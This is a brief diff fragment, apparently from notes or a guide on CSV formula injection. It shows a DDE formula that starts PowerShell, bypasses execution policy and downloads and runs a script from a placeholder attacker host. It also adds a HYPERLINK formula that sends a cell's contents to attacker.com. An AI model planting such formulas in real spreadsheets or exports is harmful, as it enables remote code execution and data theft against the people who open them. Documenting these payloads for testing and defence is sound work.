@@ -53,3 +53,4 @@ csv
 Copy
 Edit
 =DDE("powershell";"-ExecutionPolicy Bypass -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/malware.ps1')";"A1")
+=HYPERLINK("http://attacker.com/log?data="&A1, "Click me")
